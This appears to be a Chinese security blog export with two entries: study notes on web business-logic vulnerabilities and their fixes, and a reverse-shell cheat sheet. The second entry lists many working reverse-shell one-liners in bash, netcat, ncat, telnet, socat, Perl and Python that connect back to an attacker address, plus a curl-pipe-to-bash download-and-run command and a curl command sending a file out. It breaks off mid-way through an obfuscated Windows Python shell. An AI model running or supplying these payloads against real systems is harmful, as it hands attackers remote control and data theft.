<h1 id="逻辑漏洞类型"><a href="#逻辑漏洞类型" class="headerlink" title="逻辑漏洞类型"></a>逻辑漏洞类型</h1><h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><ul>
<li>漏洞介绍：即普通用户/管理员能访问其他普通用户/管理员才能够访问的系统信息或者系统功能</li>
<li>形成原因：在进行方法调用时候未进行请求用户和目标信息拥有者是否匹配一致，直接用userid/email之类的容易遍历的参数进行数据库查询</li>
<li>漏洞点：在普通用户/管理员登录后的能访问的链接或者功能中都可能存在</li>
<li>漏洞修复：在权限管理中，平行越权的权限管理颗粒度最小修复思路需要在方法中进行相关的获取请求request再利用getAttribute(“userid”)获取其userid直接使用该userid作为参数进行数据增删查改，避免userid参数传输</li>
</ul>
<h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><ul>
<li><p>漏洞介绍：即普通用户能够访问管理员甚至超级管理员才能够访问的系统信息或者系统功能</p>
</li>
<li><p>形成原因：程序再方法调用时候，缺少角色等级校验</p>
</li>
<li><p>漏洞点：在任何用户登录后才能访问的链接或者功能中都可能存在对每一个传输的参数都要了解参数的目的，尝试将用户名改为admin尝试绕过</p>
</li>
<li><p>漏洞修复：需要校验用户是否有权限访问这个方法修复思路：获取请求request再利用getAuttribute(“roleid”)获取其角色等级检查角色等级是否合法，错误则直接返回错误跳转，返回页面必须仍然从Attribute中获取userid再进一步查询相关信息值得注意的是切勿将错误跳转写到Javascript里面，还返回目标URL页面的相关信息。</p>
</li>
</ul>
<h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><h3 id="本地加密传输"><a href="#本地加密传输" class="headerlink" title="本地加密传输"></a>本地加密传输</h3><h3 id="cookie脆弱"><a href="#cookie脆弱" class="headerlink" title="cookie脆弱"></a>cookie脆弱</h3><ul>
<li><p>漏洞介绍：通过伪造cookie信息能够伪造其他用户进行登录。</p>
</li>
<li><p>漏洞原理：开发者为了方便将身份信息/登录信息明文或者只是简单编码、哈希之后存放在cookies中，网站通过获取得到的cookies进行授权或者身份验证</p>
</li>
<li><p>漏洞点：cookie中有明显或者只是简单编码、哈希的字段时候 修改lsLogin值为1可以判定为用户已经登录 修改cookie为asp163=UserName=admin</p>
</li>
<li><p>漏洞修复： Cookie不应该存储可理解的身份信息和登录信息 按照规定，cookie对身份信息和登录信息的存储只能通过存储足够长度的随机字符串进行，避免篡改</p>
</li>
</ul>
<h3 id="Session劫持"><a href="#Session劫持" class="headerlink" title="Session劫持"></a>Session劫持</h3><ul>
<li><p>漏洞介绍：会话固定攻击是利用服务器的session不变机制，借他人之手获得认证和授权，然后冒充他人</p>
</li>
<li><p>漏洞原理：在请求登录过程时候，URL带有一个session，登录成功之后会将登录成功的信息绑定到这个session中，攻击者可以发送带有session的URL给相关工作人员诱导其登录，相当于获取了其身份信息</p>
</li>
<li><p>漏洞点：在GET方法请求登录时候带有session值</p>
</li>
<li><p>修复思路：只要避免在URL中带入session信息即可比较有效的防御另外也要注意POST请求中带有sessionid进行session固定攻击，虽然可利用性比较低，但是建议修复</p>
</li>
</ul>
<h3 id="密文对比认证"><a href="#密文对比认证" class="headerlink" title="密文对比认证"></a>密文对比认证</h3><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><ul>
<li><p>漏洞介绍：攻击者可以通过该漏洞获取用户名和对应弱口令密码，并进行登录操作漏洞原理：由于没有设置登录失败次数限制，导致攻击者可以通过口令字典进行特定用户的密码爆破或通过用户名字典进行特定弱口令的用户枚举</p>
</li>
<li><p>漏洞点：系统登录点</p>
</li>
<li><p>漏洞修复： 对于固定用户名爆破密码可以针对用户名进行错误次数计算，高于一定阈值账号锁定一段时间，或者添加验证码但是不能永久锁定，可能被用来进行账户恶意锁定对于固定密码枚举用户名、 需要计算IP对URL的请求情况，某个IP短时间大量请求登录应该加入黑名单 进行传输数据加密有一定的防护效果</p>
</li>
</ul>
<h2 id="业务"><a href="#业务" class="headerlink" title="业务"></a>业务</h2><h3 id="订单ID"><a href="#订单ID" class="headerlink" title="订单ID"></a>订单ID</h3><h3 id="用户ID"><a href="#用户ID" class="headerlink" title="用户ID"></a>用户ID</h3><ul>
<li>在支付当中会出现当前用户的ID，比如：username=XXXXX，如果没有加以验证，其支付也是一次性支付没有要求输入密码什么的机制，那么就可以修改这个用户ID为其它用户ID，达到用其他用户的账号进行支付你的商品。</li>
</ul>
<h3 id="订单号码"><a href="#订单号码" class="headerlink" title="订单号码"></a>订单号码</h3><h3 id="商品ID"><a href="#商品ID" class="headerlink" title="商品ID"></a>商品ID</h3><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><h3 id="暴力破解-1"><a href="#暴力破解-1" class="headerlink" title="暴力破解"></a>暴力破解</h3><ul>
<li><p>漏洞介绍：攻击者可以通过该漏洞获取用户名和对应弱口令密码，并进行登录操作</p>
</li>
<li><p>漏洞原理：由于没有设置登录失败次数限制，导致攻击者可以通过口令字典进行特定用户的密码爆破或通过用户名字典进行特定弱口令的用户枚举 </p>
</li>
<li><p>漏洞点：系统登录点</p>
</li>
<li><p>漏洞修复： 对于固定用户名爆破密码可以针对用户名进行错误次数计算，高于一定阈值账号锁定一段时间，或者添加验证码但是不能永久锁定，可能被用来进行账户恶意锁定对于固定密码枚举用户名、 需要计算IP对URL的请求情况，某个IP短时间大量请求登录应该加入黑名单 进行传输数据加密有一定的防护效果</p>
</li>
</ul>
<h3 id="绕过验证"><a href="#绕过验证" class="headerlink" title="绕过验证"></a>绕过验证</h3><ul>
<li><p>漏洞介绍：攻击者通过篡改分步逻辑中的步骤数字，达到绕过支付、校验等效果</p>
</li>
<li><p>漏洞原理：程序逻辑分布进行，但是对步骤、验证信息、支付信息没有做好严格校验，导致修改步骤就直接绕过验证或者支付</p>
</li>
<li><p>漏洞点：任何分布逻辑且带步骤数字，或者利用JS进行步骤控制的功能中</p>
</li>
<li><p>漏洞修复：在请求最后一步时候需要带入前面的验证信息，服务端再进行一次校验信息的验证，验证正确方能继续执行数据操作也可以及通过getAttributr(“userid”)获取userid进行userid和验证结果绑定，最后一步不带入验证信息，但是仍然要获取userid进行校验再最后一步通过验证之后或者服务器收到支付信息后再生成相应的数据交给用户</p>
</li>
</ul>
<h3 id="自动识别"><a href="#自动识别" class="headerlink" title="自动识别"></a>自动识别</h3><h3 id="图形验证码绕过"><a href="#图形验证码绕过" class="headerlink" title="图形验证码绕过"></a>图形验证码绕过</h3><ul>
<li><p>漏洞介绍：攻击者通过突破图形验证码的验证，可以实现如登录爆破、验证码绕过等攻击</p>
</li>
<li><p>漏洞原理：图形验证码在错误后未失效返回验证码信息分步验证验证码</p>
</li>
<li><p>漏洞点：任何存在图形验证码的功能中</p>
</li>
<li><p>漏洞修复一旦验证码使用过了，必须要进行删除，重新生成验证码，可以梵高attribute中验证码需要设置超时，时间一到立即删除旧验证码，用户需要获取新的验证码验证码只需要返回图片，切勿将生成验证码的字符串也一并返回验证码不应该进行分布校验，应该连同请求数据一起发送到目标服务器进行校验，服务器校验通过则返回合法数据，否则返回错误</p>
</li>
</ul>
<h2 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h2><h3 id="支付篡改"><a href="#支付篡改" class="headerlink" title="支付篡改"></a>支付篡改</h3><ul>
<li>在支付当中，购买商品一般分为三步骤：订购、确认信息、付款。那么这个修改价格具体是修改哪一步时的价格呢？可以在这三个步骤当中的随便一个步骤进行修改价格测试，如果前面两步有验证机制，那么可在最后一步付款时进行抓包尝试修改金额，如果没有在最后一步做好检验，那么问题就会存在，其修改的金额值你可以尝试小数目或者尝试负数。</li>
</ul>
<h3 id="数量篡改"><a href="#数量篡改" class="headerlink" title="数量篡改"></a>数量篡改</h3><ul>
<li>在支付的过程中，数量也同时决定着价格，比如：1个数量商品对应的是100，2个数据就是200，那么当你修改这个值数量值为负数时，那么其金额也会变为负数，最后就会导致支付问题的产生。</li>
</ul>
<h3 id="请求重放"><a href="#请求重放" class="headerlink" title="请求重放"></a>请求重放</h3><ul>
<li><p>漏洞介绍：通过数据包重放，可以造成短信轰炸、邮件轰炸、重复提交订单等</p>
</li>
<li><p>漏洞原理：后台未进行相关操作的技术导致数据包重放</p>
</li>
<li><p>漏洞点：短信验证码、邮件校验、提交订单等功能。</p>
</li>
<li><p>修复方案：修复思路（针对短信、邮件）构造一个Hashmap&lt;String，short&gt;，存放邮箱或电话号码及对应次数只要某个邮箱或者电话号码次数够了，就不能继续发送了或者计算两次发送的时间间隔，时间过短就不继续发送了通用修复方案需要建立token机制或验证码机制，一次有效</p>
</li>
</ul>
<h3 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h3><h2 id="找回机制"><a href="#找回机制" class="headerlink" title="找回机制"></a>找回机制</h2><h3 id="客户端回显"><a href="#客户端回显" class="headerlink" title="客户端回显"></a>客户端回显</h3><h3 id="Response状态值"><a href="#Response状态值" class="headerlink" title="Response状态值"></a>Response状态值</h3><h3 id="Session覆盖"><a href="#Session覆盖" class="headerlink" title="Session覆盖"></a>Session覆盖</h3><h3 id="弱Token缺陷"><a href="#弱Token缺陷" class="headerlink" title="弱Token缺陷"></a>弱Token缺陷</h3><ul>
<li>token可爆破</li>
</ul>
<h3 id="找回流程绕过"><a href="#找回流程绕过" class="headerlink" title="找回流程绕过"></a>找回流程绕过</h3><ul>
<li>通过两个不同账号的找回，获得验证码之后部分的数据包，而另一个账号找回密码时跳过验证码的部分直接进入成功验证之后的部分，等</li>
</ul>
<h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><h3 id="调用遍历"><a href="#调用遍历" class="headerlink" title="调用遍历"></a>调用遍历</h3><h3 id="参数篡改"><a href="#参数篡改" class="headerlink" title="参数篡改"></a>参数篡改</h3><ul>
<li><p>漏洞介绍：攻击者通过进行数值篡改进行攻击，从而获利</p>
</li>
<li><p>漏洞原理：没有对传输数据添加相关的校验参数后台未对参数值进行校验并直接使用数据包中的参数</p>
</li>
<li><p>漏洞点：抽奖、购买、转账、返现等功能</p>
</li>
<li><p>漏洞修复：对于软件来说，需要保护好内存数据，防止内存数据篡改计算传输数据的哈希，并将哈希附加在传输数据中作为校验值，避免被篡改先校验数值，防止大整数和负数；接着利用传输的商品ID从数据库中获取商品单价重新进行价格计算；最后生成订单（订单号应为随机值）</p>
</li>
</ul>
<h3 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h3><ul>
<li><p>漏洞介绍：即游客能够访问普通用户甚至超级管理员才能访问的系统信息或者系统功能</p>
</li>
<li><p>形成原因：主要是系统设计期间没有进行全局用户身份校验；或者校验存在缺陷</p>
</li>
<li><p>漏洞点：在任何用户登录后才能访问的链接或者功能中都可能存在</p>
</li>
<li><p>漏洞修复：J2EE中存在filter，可以获取用户的cookie等信息修复思路：建立LoginList，值是当前在线用户的id对所有需要登录访问到URL，获取请求request再利用 getAttribute(“userid”) 获取其userid检查userid是否存在于LoginList中，不存在则直接返回错误跳转值得注意的是切勿将错误跳转写到Javascript里面，还返回目标URL页面的相关信息</p>
</li>
</ul>
<h3 id="Webservice测试"><a href="#Webservice测试" class="headerlink" title="Webservice测试"></a>Webservice测试</h3><h3 id="callback自定义"><a href="#callback自定义" class="headerlink" title="callback自定义"></a>callback自定义</h3><h2 id="回退"><a href="#回退" class="headerlink" title="回退"></a>回退</h2><ul>
<li><h3 id="回退重放"><a href="#回退重放" class="headerlink" title="回退重放"></a>回退重放</h3></li>
</ul>
<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><ul>
<li><p>漏洞介绍：可以通过同时重放大量数据包进行漏洞利用，通常用于突破限量、限额的问题都有奇效</p>
</li>
<li><p>漏洞原理：由于目标函数中，判断与数据修复两个步骤之间，或者两个数据修改步骤之间存在时间差，且函数未进行同步锁定，则可以造成漏洞</p>
</li>
<li><p>漏洞点：程序中存在限制，可以猜测到后台有判断与修改操作的方法</p>
</li>
<li><p>漏洞修复：修复思路：使用synchronized关键字，可以限制同一时间内访问方法的只有单一线程并不是每个条件竞争都必须修复</p>
</li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell合集</title>
    <url>/2022/05/13/%E5%8F%8D%E5%BC%B9shell%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<p>假设本机地址10.10.10.11，监听端口443。</p>
<h2 id="Bash环境下反弹TCP协议shell"><a href="#Bash环境下反弹TCP协议shell" class="headerlink" title="Bash环境下反弹TCP协议shell"></a>Bash环境下反弹TCP协议shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>然后在靶机上执行如下命令：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/10.10.10.11/</span><span class="number">443</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="regexp">/bin/</span>bash -i &gt; <span class="regexp">/dev/</span>tcp<span class="regexp">/10.10.10.11/</span><span class="number">443</span> <span class="number">0</span>&lt;&amp; <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">exec <span class="number">5</span>&lt;&gt;<span class="regexp">/dev/</span>tcp<span class="regexp">/10.10.10.11/</span><span class="number">443</span>;cat &lt;&amp;<span class="number">5</span> | <span class="keyword">while</span> read line; <span class="keyword">do</span> <span class="variable">$line</span> <span class="number">2</span>&gt;&amp;<span class="number">5</span> &gt;&amp;<span class="number">5</span>; done</span><br><span class="line"></span><br><span class="line">exec <span class="regexp">/bin/</span>sh <span class="number">0</span>&lt;<span class="regexp">/dev/</span>tcp<span class="regexp">/10.10.10.11/</span><span class="number">443</span> <span class="number">1</span>&gt;&amp;<span class="number">0</span> <span class="number">2</span>&gt;&amp;<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>&lt;&amp;<span class="number">196</span>;exec <span class="number">196</span>&lt;&gt;<span class="regexp">/dev/</span>tcp<span class="regexp">/10.10.10.11/</span><span class="number">443</span>; sh &lt;&amp;<span class="number">196</span> &gt;&amp;<span class="number">196</span> <span class="number">2</span>&gt;&amp;<span class="number">196</span></span><br></pre></td></tr></table></figure>

<h2 id="Bash环境下反弹UDP协议shell"><a href="#Bash环境下反弹UDP协议shell" class="headerlink" title="Bash环境下反弹UDP协议shell:"></a>Bash环境下反弹UDP协议shell:</h2><p>首先在本地监听UDP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -u -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sh</span> -i &gt;&amp; /dev/udp/<span class="number">10.10.10.11</span>/<span class="number">443</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="使用Netcat反弹shell"><a href="#使用Netcat反弹shell" class="headerlink" title="使用Netcat反弹shell"></a>使用Netcat反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -e /bin/sh <span class="number">10.10.10.11</span> <span class="number">443</span></span><br><span class="line"><span class="attribute">nc</span> -e /bin/bash <span class="number">10.10.10.11</span> <span class="number">443</span></span><br><span class="line"><span class="attribute">nc</span> -c bash <span class="number">10.10.10.11</span> <span class="number">443</span></span><br><span class="line"><span class="attribute">mknod</span> backpipe p &amp;&amp; nc <span class="number">10.10.10.11</span> <span class="number">443</span> <span class="number">0</span>&lt;backpipe | /bin/bash <span class="number">1</span>&gt;backpipe </span><br><span class="line"><span class="attribute">rm</span> /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">10.10.10.11</span> <span class="number">443</span> &gt;/tmp/f</span><br><span class="line"><span class="attribute">rm</span> -f /tmp/p; mknod /tmp/p p &amp;&amp; nc <span class="number">10.10.10.11</span> <span class="number">443</span> <span class="number">0</span>/tmp/p <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="attribute">rm</span> f;mkfifo f;cat f|/bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">10.10.10.11</span> <span class="number">443</span> &gt; f</span><br><span class="line"><span class="attribute">rm</span> -f x; mknod x p &amp;&amp; nc <span class="number">10.10.10.11</span> <span class="number">443</span> <span class="number">0</span>&lt;x | /bin/bash <span class="number">1</span>&gt;x</span><br></pre></td></tr></table></figure>

<h2 id="使用Ncat反弹shell"><a href="#使用Ncat反弹shell" class="headerlink" title="使用Ncat反弹shell"></a>使用Ncat反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ncat</span> <span class="number">10.10.10.11</span> <span class="number">443</span> -e /bin/bash</span><br><span class="line"><span class="attribute">ncat</span> --udp <span class="number">10.10.10.11</span> <span class="number">443</span> -e /bin/bash</span><br></pre></td></tr></table></figure>

<h2 id="利用curl反弹shell"><a href="#利用curl反弹shell" class="headerlink" title="利用curl反弹shell"></a>利用curl反弹shell</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/192.168.20.151/</span><span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">curl http:<span class="regexp">//</span><span class="number">174.1</span>.<span class="number">73.154</span>/shell.txt|bash</span><br></pre></td></tr></table></figure>

<p>PS：OOB的时候可以</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">curl</span> <span class="number">174.2.171.201:6666</span> -d @/flag</span><br></pre></td></tr></table></figure>

<p>加<code>@</code>表示文件</p>
<h2 id="利用Telnet反弹shell"><a href="#利用Telnet反弹shell" class="headerlink" title="利用Telnet反弹shell"></a>利用Telnet反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">rm</span> -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet <span class="number">10.10.10.11</span> <span class="number">443</span> <span class="number">0</span>/tmp/p <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="attribute">telnet</span> <span class="number">10.10.10.11</span> <span class="number">443</span> | /bin/bash | telnet <span class="number">10.10.10.11</span> <span class="number">444</span></span><br><span class="line"><span class="attribute">rm</span> f;mkfifo f;cat f|/bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|telnet <span class="number">10.10.10.11</span> <span class="number">443</span> &gt; f</span><br><span class="line"><span class="attribute">rm</span> -f x; mknod x p &amp;&amp; telnet <span class="number">10.10.10.11</span> <span class="number">443</span> <span class="number">0</span>&lt;x | /bin/bash <span class="number">1</span>&gt;x</span><br></pre></td></tr></table></figure>

<h2 id="使用Socat反弹shell"><a href="#使用Socat反弹shell" class="headerlink" title="使用Socat反弹shell"></a>使用Socat反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">socat</span> file:`tty`,raw,echo=<span class="number">0</span> TCP-L:<span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/tmp/</span>socat exec:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:<span class="number">10.10</span>.<span class="number">10.11</span>:<span class="number">443</span></span><br><span class="line">socat tcp-connect:<span class="number">10.10</span>.<span class="number">10.11</span>:<span class="number">443</span> exec:<span class="string">&quot;bash -li&quot;</span>,pty,stderr,setsid,sigint,sane</span><br><span class="line">wget -q https:<span class="regexp">//gi</span>thub.com<span class="regexp">/andrew-d/</span>static-binaries<span class="regexp">/raw/m</span>aster<span class="regexp">/binaries/</span>linux<span class="regexp">/x86_64/</span>socat -O <span class="regexp">/tmp/</span>socat; chmod +x <span class="regexp">/tmp/</span>socat; <span class="regexp">/tmp/</span>socat exec:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:<span class="number">10.10</span>.<span class="number">10.11</span>:<span class="number">443</span></span><br></pre></td></tr></table></figure>

<h2 id="利用Perl脚本反弹"><a href="#利用Perl脚本反弹" class="headerlink" title="利用Perl脚本反弹"></a>利用Perl脚本反弹</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">perl -e &#x27;use Socket;<span class="variable">$i</span>=<span class="string">&quot;10.10.10.11&quot;</span>;<span class="variable">$p</span>=<span class="number">443</span>;<span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">&quot;tcp&quot;</span>));<span class="keyword">if</span>(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;<span class="keyword">open</span>(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;</span><br><span class="line">perl -MIO -e &#x27;<span class="variable">$p</span>=fork;<span class="keyword">exit</span>,<span class="keyword">if</span>(<span class="variable">$p</span>);<span class="variable">$c</span>=new IO::Socket::INET(PeerAddr,<span class="string">&quot;10.10.10.11:443&quot;</span>);STDIN-&gt;fdopen(<span class="variable">$c</span>,r);$~-&gt;fdopen(<span class="variable">$c</span>,w);system<span class="variable">$_</span> <span class="keyword">while</span>&lt;&gt;;&#x27;</span><br></pre></td></tr></table></figure>

<p>win平台下执行：</p>
<figure class="highlight pf"><table><tr><td class="code"><pre><span class="line">perl -MIO -e &#x27;<span class="variable">$c</span>=new IO::Socket::INET(PeerAddr,<span class="string">&quot;10.10.10.11:443&quot;</span>);STDIN-&gt;fdopen(<span class="variable">$c</span>,r);$~-&gt;fdopen(<span class="variable">$c</span>,w);system<span class="variable">$_</span> while<span class="variable">&lt;&gt;</span>;&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="利用Python脚本反弹shell"><a href="#利用Python脚本反弹shell" class="headerlink" title="利用Python脚本反弹shell"></a>利用Python脚本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<p>IPv4协议如下：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>));os.dup<span class="number">2</span>(s.fileno(),<span class="number">0</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">1</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);&#x27;</span><br><span class="line"><span class="attribute">export</span> RHOST=<span class="string">&quot;10.10.10.11&quot;</span>;export RPORT=<span class="number">443</span>;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(<span class="string">&quot;RHOST&quot;</span>),int(os.getenv(<span class="string">&quot;RPORT&quot;</span>))));[os.dup<span class="number">2</span>(s.fileno(),fd) for fd in (<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>)];pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>)&#x27;</span><br><span class="line"><span class="attribute">python</span> -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>));os.dup<span class="number">2</span>(s.fileno(),<span class="number">0</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">1</span>);os.dup<span class="number">2</span>(s.fileno(),<span class="number">2</span>);import pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p>IPv6协议如下：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> -c &#x27;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET<span class="number">6</span>,socket.SOCK_STREAM);s.connect((<span class="string">&quot;dead:beef:2::125c&quot;</span>,<span class="number">443</span>,<span class="number">0</span>,<span class="number">2</span>));os.dup<span class="number">2</span>(s.fileno(),<span class="number">0</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">1</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">2</span>);p=pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>);&#x27;</span><br></pre></td></tr></table></figure>

<p>Windows平台如下:</p>
<figure class="highlight inform7"><table><tr><td class="code"><pre><span class="line">C:\Python27\python.exe -c <span class="string">&quot;(lambda __y, __g, __contextlib: <span class="subst">[[[[[[[(s.connect((&#x27;10.10.10.11&#x27;, 443)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0]</span>(lambda: None)]<span class="subst">[2]</span>)(__contextlib.nested(type(&#x27;except&#x27;, (), &#123;&#x27;__enter__&#x27;: lambda self: None, &#x27;__exit__&#x27;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and <span class="subst">[True for __out[0]</span> in <span class="subst">[((s.close(), lambda after: after())[1]</span>)]]<span class="subst">[0]</span>)&#125;)(), type(&#x27;try&#x27;, (), &#123;&#x27;__enter__&#x27;: lambda self: None, &#x27;__exit__&#x27;: lambda __self, __exctype, __value, __traceback: <span class="subst">[False for __out[0]</span> in <span class="subst">[((p.wait(), (lambda __after: __after()))[1]</span>)]]<span class="subst">[0]</span>&#125;)())))(<span class="subst">[None]</span>))<span class="subst">[1]</span> for p2s_thread.daemon in <span class="subst">[(True)]</span>]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;p2s_thread&#x27;]</span> in <span class="subst">[(threading.Thread(target=p2s, args=[s, p]</span>))]]<span class="subst">[0]</span>)<span class="subst">[1]</span> for s2p_thread.daemon in <span class="subst">[(True)]</span>]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;s2p_thread&#x27;]</span> in <span class="subst">[(threading.Thread(target=s2p, args=[s, p]</span>))]]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;p&#x27;]</span> in <span class="subst">[(subprocess.Popen([&#x27;\\windows\\system32\\cmd.exe&#x27;]</span>, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]]<span class="subst">[0]</span>)<span class="subst">[1]</span> for __g<span class="subst">[&#x27;s&#x27;]</span> in <span class="subst">[(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]</span>]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;p2s&#x27;]</span>, p2s.__name__ in <span class="subst">[(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#x27;s&#x27;]</span>.send(__l<span class="subst">[&#x27;p&#x27;]</span>.stdout.read(1)), __this())<span class="subst">[1]</span> if True else __after())())(lambda: None) for __l<span class="subst">[&#x27;s&#x27;]</span>, __l<span class="subst">[&#x27;p&#x27;]</span> in <span class="subst">[(s, p)]</span>]<span class="subst">[0]</span>)(&#123;&#125;), &#x27;p2s&#x27;)]]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;s2p&#x27;]</span>, s2p.__name__ in <span class="subst">[(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#x27;p&#x27;]</span>.stdin.write(__l<span class="subst">[&#x27;data&#x27;]</span>), __after())<span class="subst">[1]</span> if (len(__l<span class="subst">[&#x27;data&#x27;]</span>) &gt; 0) else __after())(lambda: __this()) for __l<span class="subst">[&#x27;data&#x27;]</span> in <span class="subst">[(__l[&#x27;s&#x27;]</span>.recv(1024))]]<span class="subst">[0]</span> if True else __after())())(lambda: None) for __l<span class="subst">[&#x27;s&#x27;]</span>, 